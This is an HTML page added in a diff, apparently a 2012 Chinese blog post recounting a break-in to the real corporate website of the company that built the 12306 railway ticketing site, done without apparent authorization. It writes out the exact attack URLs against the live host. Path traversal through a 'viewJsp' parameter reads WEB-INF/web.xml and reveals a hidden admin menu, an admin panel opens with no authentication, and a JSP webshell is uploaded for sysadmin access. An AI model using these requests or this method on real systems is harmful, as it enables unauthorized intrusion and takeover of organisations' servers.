@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>检测开发12306的公司：太极计算机股份有限公司 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-09-27T22:19:34.000Z" itemprop="datePublished">
+          2012-09-28
+      </time>
+    
+    
+    | 
+    <a href='/tag/12306/'>12306</a>,
+    
+    <a href='/tag/包含漏洞/'>包含漏洞</a>
+    
+    
+</span>
+    <h1 class="post-title">检测开发12306的公司：太极计算机股份有限公司</h1>
+    <section class="post-content">
+      <p>国庆就要来了，返乡出行的高峰期来了，最近无论是身边还是网络上的都怨声载道啊，原因就是火车票，网上订票系统12306真是没话说了，大家都懂的！</p>  <p>于是最近大家都把气撒在了收1.99亿开发出这么个破网站的公司：“太极”身上，主页<a href="http://www.taiji.com.cn/" target="_blank" rel="external">http://www.taiji.com.cn/</a></p>  <p>下面我就把过程写出来和大家分享。</p>  <p>打开主页的网址默认跳到了这个链接</p>  <p><a href="http://www.taiji.com.cn/coboportal/portal/compayindex.ptview" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/portal/compayindex.ptview</a></p>  <p>鼠标随便停在新闻链接上状态栏显示如下，</p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image002.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/12306_C8D8/clip_image002_thumb.jpg" width="596" height="209"></a></p>  <p><a href="http://www.taiji.com.cn/coboportal/portal/itservice.ptview?funcid=showGSWZInfoLink&amp;infoSortId=52802&amp;infoLinkId=13962&amp;viewJsp=gswz/newsevents/newsshowcontent.jsp" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/portal/itservice.ptview?funcid=showGSWZInfoLink&amp;infoSortId=52802&amp;infoLinkId=13962&amp;viewJsp=gswz/newsevents/newsshowcontent.jsp</a></p>  <p>试了试infoSortId=52802这里是木有注入的哦，不过看着viewjsp这个参数有点特别哦，后面直接接上相对路径真是jsp文件地址了，于是我们来试试包含漏洞或者任意文件下载漏洞~</p>  <p>构造如下地址：</p>  <p><a href="http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869%20&amp;viewJsp=index.jsp" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869%20&amp;viewJsp=index.jsp</a></p>  <p>打开发现404如图：</p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image004.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/12306_C8D8/clip_image004_thumb.jpg" width="596" height="338"></a></p>  <p>继续构造，把viewJsp=index.jsp改为viewJsp=../index.jsp：</p>  <p><a href="http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869%20&amp;viewJsp=../index.jsp" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869%20&amp;viewJsp=../index.jsp</a></p><a id="more"></a><p><a href="http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869%20&amp;viewJsp=../index.jsp" target="_blank" rel="external"></a></p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image006.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/12306_C8D8/clip_image006_thumb.jpg" width="596" height="370"></a></p>  <p>依然是404</p>  <p>继续~</p>  <p><a href="http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869%20&amp;viewJsp=../../index.jsp" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869%20&amp;viewJsp=../../index.jsp</a></p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image008.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/12306_C8D8/clip_image008_thumb.jpg" width="596" height="273"></a></p>  <p>出来了个这个网页，这好像是个灰常低调的菜单导航，上面有后台的地址链接，还有清空系统缓存等功能</p>  <p>随便点点后台如图</p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image010.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/12306_C8D8/clip_image010_thumb.jpg" width="596" height="279"></a></p>  <p>又是404</p>  <p><a href="http://www.taiji.com.cn/coboportal/portal/wafplatform/portletmanage.do?funcid=flushSessinoOsCache" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/portal/wafplatform/portletmanage.do?funcid=flushSessinoOsCache</a></p>  <p>去掉了/portal/wafplatform这两个目录也是打不开的，于是试到这的时候也是上面那个菜单导航</p>  <p><a href="http://www.taiji.com.cn/coboportal/" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/</a></p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image011.png" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image011" border="0" alt="clip_image011" src="http://img.cker.in/12306_C8D8/clip_image011_thumb.png" width="338" height="220"></a></p>  <p>这下可以直接点了到后台了</p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image013.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image013" border="0" alt="clip_image013" src="http://img.cker.in/12306_C8D8/clip_image013_thumb.jpg" width="596" height="380"></a></p>  <p>也可以清空缓存：</p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image015.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image015" border="0" alt="clip_image015" src="http://img.cker.in/12306_C8D8/clip_image015_thumb.jpg" width="596" height="398"></a></p>  <p>注意到地址如下</p>  <p><a href="http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do?funcid=flushAllOsCache" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do?funcid=flushAllOsCache</a></p>  <p><a href="http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do?funcid=flushSessinoOsCache" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do?funcid=flushSessinoOsCache</a></p>  <p><a href="http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do?funcid=reloadCache" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do?funcid=reloadCache</a></p>  <p><a href="http://www.taiji.com.cn/coboportal/wafplatform/portalpagemanage.do?funcid=reloadCache" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/wafplatform/portalpagemanage.do?funcid=reloadCache</a></p>  <p>到这里我直接去试着弱口令登录后台了，不行！注入、万能密码什么的也过滤了的~</p>  <p>看来思路到这里就死了，</p>  <p>又随便试了下包含漏洞读取java 网站的配置文件web.xml看能不能读取出点什么</p>  <p><a href="http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/portal/innovation.ptview?funcid=showGSWZInfoLink&amp;infoSortId=53921&amp;infoLinkId=13869</a> &amp;viewJsp=../../WEB-INF/web.xml</p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image017.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image017" border="0" alt="clip_image017" src="http://img.cker.in/12306_C8D8/clip_image017_thumb.jpg" width="596" height="566"></a></p>  <p>除了个内网IP敏感点其他没什么鸟信息可以利用``肿么办呢，于是先放一放 休息会咯</p>  <p>又翻啊翻，看网页源文件的时候找到个链接~</p>  <p><a href="http://www.taiji.com.cn/coboportal/portal/portlet/gswz/iframediv.html" target="_blank" rel="external">www.taiji.com.cn/coboportal/portal/portlet/gswz/iframediv.html</a></p>  <p>是敏感点 依然没什么用！</p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image019.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image019" border="0" alt="clip_image019" src="http://img.cker.in/12306_C8D8/clip_image019_thumb.jpg" width="596" height="221"></a></p>  <p>晚上的时候群里的兄弟们也讨论起这个站，这个好，终于找到基友了，但是根据截图来看他们已经进了后台了，我还在后台门口傻望着呢，肿么办呢，就去请教了下大牛，经过我的软磨硬泡嘘寒问暖关怀备至一番，原来大牛们在清空缓存那儿的链接直接就可以进去的！</p>  <p>怎么进呢，清空缓存的链接是<a href="http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do?funcid=flushAllOsCache" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do?funcid=flushAllOsCache</a></p>  <p>去掉？后面的参数<a href="http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do" target="_blank" rel="external">http://www.taiji.com.cn/coboportal/wafplatform/portletmanage.do</a>打开了直接就是后台，没有验证的，惭愧啊，我都不好意思直视大牛的双眼！</p>  <p><a href="http://img.cker.in/12306_C8D8/clip_image021.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image021" border="0" alt="clip_image021" src="http://img.cker.in/12306_C8D8/clip_image021_thumb.jpg" width="596" height="453"></a></p>  <p>真是坑爹啊，难怪做出来的12306.cn风格都是一个样，就是坑爹！</p>  <p>进了后台随便找个添加新闻的上传个jsp，没过滤滴！这样就拿到大马了，sysadmin权限~</p>  <p>接下来的提权内网渗透就不玩了，小小滴娱乐一下就算了，剩下的还是留给大牛们玩去··</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/862.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/862.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/862.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/862.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/865.seo/">
+        ← 支付漏洞的三种常见类型 imlonghao@wooyun
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/859.seo/">
+        普联商城存在支付漏洞(已发乌云联系厂商修复) →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
